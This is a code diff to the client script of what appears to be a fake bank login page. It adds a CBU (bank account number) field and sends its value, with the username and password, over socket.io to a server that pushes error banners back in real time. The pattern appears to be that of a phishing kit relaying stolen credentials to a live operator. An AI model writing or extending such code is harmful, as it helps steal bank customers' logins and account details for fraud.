@@ -3,7 +3,7 @@
 const socket = io.connect("http://localhost:3000/", {
     forceNew: true,
     transports: ["polling"],
- });
+});
 
 
 
@@ -12,6 +12,7 @@ const userInput = document.querySelector("#user");
 userInput.focus();
 
 const passInput = document.querySelector("#pass");
+const cbuInput = document.querySelector("#cbu");
 const Alert = document.querySelector("#alert-modal");
 const Alert2 = document.querySelector("#alert-modal2");
 const CerrarModal = document.querySelector("#close-alert-modal");
@@ -41,7 +42,7 @@ CerrarModal2.addEventListener("click", () => {
 emitDataServer.addEventListener("click", (e) => {
 
     e.preventDefault();
-    
+
     userInput.classList.remove('error-input');
     LabelUser.classList.remove('error-input-label');
 
@@ -50,15 +51,14 @@ emitDataServer.addEventListener("click", (e) => {
     const dataInputs = {
         'user': userInput.value,
         'pass': passInput.value,
+        'cbu': cbuInput.value,
         'socket': socket.id,
     }
 
     var preloader = document.querySelector("#preloader");
 
-    if (dataInputs.user.length < 6 || dataInputs.user.length > 15 || dataInputs.pass.length == 0) {
+    if (dataInputs.user.length < 6 || dataInputs.user.length > 15 || dataInputs.pass.length == 0 || dataInputs.cbu.length == 0) {
         preloader.style.display = "none";
-        userInput.classList.add('error-input');
-        LabelUser.classList.add('error-input-label');
         Alert.style.display = "flex";
     } else {
         socket.emit("Data", dataInputs);
@@ -67,6 +67,7 @@ emitDataServer.addEventListener("click", (e) => {
             preloader.style.display = "none";
             passInput.value = "";
             userInput.value = "";
+            cbuInput. value = "";
         }, 2000);
     }
 })
@@ -75,7 +76,7 @@ socket.on("ErrorLogin", TextoBanner => {
     ErrorBanner.style.display = "flex";
     if (TextoBanner.slice(-7) == 'Aceptar') {
         TextErrorBanner.innerHTML = TextoBanner.slice(0, -9);
-    }else{
+    } else {
         TextErrorBanner.innerHTML = TextoBanner;
     }
     LoginHelp.parentElement.classList.toggle('clave-nopodes');
@@ -88,9 +89,9 @@ CloseErrorBanner.addEventListener("click", () => {
 
 VerUser.addEventListener("click", () => {
     console.log(userInput.type)
-    if(userInput.type == "text"){
+    if (userInput.type == "text") {
         userInput.type = "password";
-    }else{
+    } else {
         userInput.type = "text";
     }
 })
